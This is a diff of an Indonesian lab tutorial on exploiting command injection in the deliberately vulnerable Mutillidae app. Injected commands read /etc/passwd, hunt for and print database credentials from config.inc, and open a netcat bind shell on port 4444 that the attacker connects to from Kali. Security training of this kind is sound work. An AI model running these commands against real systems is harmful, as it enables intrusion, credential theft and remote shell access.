@@ -34,6 +34,7 @@ Dan jangan lupa untuk menambahkan 1 spasi diakhir, `"-- "`. Operasi ini adalah t
 * **Step 2** : Masukan command linux pada textbox tersebut `cat /etc/passwd` dan `netstat -nao | grep "0.0.0.0:"`.
 **cat /etc/passwd** : melihat informasi untuk login, dengan field antara lain Username, Password Existance, User ID, Group ID, Gecos, Home Directory, and Shell
 **netstat -nao | grep "0.0.0.0:"** : melihat koneksi port yang sedang berlangsung pada ip 0.0.0.0
+
 ![](/assets/lesson-10/backdoor_4.JPG)
 
 Terlihat ada user-user yang potensial untuk diserang seperti user apache, mysql, dll.
@@ -44,27 +45,38 @@ Terlihat ada port-port yang biasa digunakan oleh suatu service yang potensial un
 
 ### \# Menggunakan Backdoor untuk pengamatan Database
 
-* **Step 1** : Masukan command linux pada textbox tersebut `ls | grep ".inc`. Hal ini dilakukan untuk mencari file berekstensi `.inc` di directory Mutillidae, yang disasar adalah username dan password database mysql.
+* **Step 1** : Mencari file yang berisi konfigurasi database, dengan execute command `find /var/www/mutillidae | xargs grep -i "dbuser"`.
+![](/assets/lesson-10/backdoor_6.JPG)
 
 Terlihat terdapat file `config.inc`, file ini diduga berisi konfigurasi database mysql.
 
 * **Step 2** : Masukan command linux pada textbox tersebut `cat config.inc | grep -v "<?php"`. Hal ini dilakukan untuk melihat file sebab jika kita tidak gunakan `grep` web tidak akan mencetak nya karena file berisi script php
+![](/assets/lesson-10/backdoor_7.JPG)
 
-Terlihat host, username, password, dan nama database dari MySQL yang digunakan web Mutillidae
+Tercatat :
+**host** : localhost atau 0.0.0.0
+**user** : root
+**password** : (kosong)
+**nama database** : owasp10
 
 ### \# Menggunakan Backdoor untuk pengamatan Netcat
 
 * **Step 1** : Masukan command linux pada textbox tersebut `which nc; netstat -nao | grep 4444 | wc -l`.
 **which nc** : melihat dimana netcat berada
 **netstat -nao | grep 4444 | wc -l** : melihat jumlah semua koneksi ke port 4444
+![](/assets/lesson-10/backdoor_8.JPG)
+
 
 * **Step 2** : Masukan command linux pada textbox tersebut `mkfifo /tmp/pipe;sh /tmp/pipe | nc -l 4444 > /tmp/pipe`.
 **mkfifo** : proses dapat saling berkomunikasi dilakukan melalui pipes. Pipes dapat dibuat dengan mengunakan perintah ini
 **nc -l 4444** : meminta netcat untuk listen & allow connections di port 4444
+![](/assets/lesson-10/backdoor_9.JPG)
 
 Terlihat koneksi terus berputar hal ini manandakan port 444 sedang listen atau menunggu adanya koneksi/transfer data
 
-* **Step 3** : Sebari langkah 2 berjalan, masukan command linux pada terminal Kali Linux `nc 10.151.36.64 4444`. Kemudian masukan command cli yang anda inginkan.
+* **Step 3** : Sembari langkah 2 berjalan, masukan command linux pada terminal Kali Linux `nc 10.151.36.64 4444`. Kemudian masukan command cli yang anda inginkan.
+
+
 
 
 
